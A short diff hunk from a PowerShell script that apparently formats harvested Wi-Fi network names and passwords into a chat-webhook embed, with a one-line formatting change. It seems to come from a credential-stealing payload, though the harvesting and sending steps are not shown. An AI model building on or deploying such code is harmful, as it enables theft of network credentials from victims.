@@ -28,7 +28,7 @@ $forEmbed =  [PSCustomObject]@{
     'color'       = '16744960'
     'fields'   = @(@{
     'name' = ""
-    'value' = "**" + $wifinames + "**" + $wifipass.Replace(":", "") | Format-Table | Out-String
+    'value' = "**" + $wifinames + "**" + $wifipass.Replace(":", "") 
     'inline' = $false
     })
 }
